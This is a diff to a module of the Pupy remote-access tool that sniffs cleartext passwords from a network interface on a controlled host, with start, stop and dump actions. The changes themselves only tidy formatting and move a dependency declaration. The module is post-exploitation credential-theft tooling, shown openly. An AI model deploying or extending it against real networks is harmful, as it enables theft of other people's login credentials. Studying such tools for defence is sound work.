@@ -1,4 +1,4 @@
-# -*- coding: UTF8 -*-
+# -*- coding: utf-8 -*-
 # Thanks to Dan McInerney for its net-creds project
 # Github: https://github.com/DanMcInerney/net-creds
 from pupylib.PupyModule import *
@@ -10,12 +10,12 @@ __class_name__="NetCreds"
 
 @config(cat="gather", compat=["linux", "windows"])
 class NetCreds(PupyModule):
-    """ 
+    """
         Sniffs cleartext passwords from interface
     """
-    daemon=True
-    unique_instance=True
-    dependencies=['scapy', 'gzip', 'BaseHTTPServer']
+    daemon = True
+    unique_instance = True
+    dependencies=[ 'scapy', 'gzip', 'BaseHTTPServer', 'pupyutils.netcreds' ]
 
     def init_argparse(self):
         self.arg_parser = PupyArgumentParser(prog='netcreds', description=self.__doc__)
@@ -24,8 +24,6 @@ class NetCreds(PupyModule):
         self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])
 
     def run(self, args):
-        self.client.load_package("pupyutils.netcreds")
-
         if args.action=="start":
             with redirected_stdio(self.client.conn): #to see the output exception in case of error
                 r = self.client.conn.modules["pupyutils.netcreds"].netcreds_start(args.interface, args.filterip)
@@ -43,7 +41,7 @@ class NetCreds(PupyModule):
                 pass
 
             data=self.client.conn.modules["pupyutils.netcreds"].netcreds_dump()
-             
+
             if data is None:
                 self.error("Network credentials sniffer has not been started yet")
             elif not data:
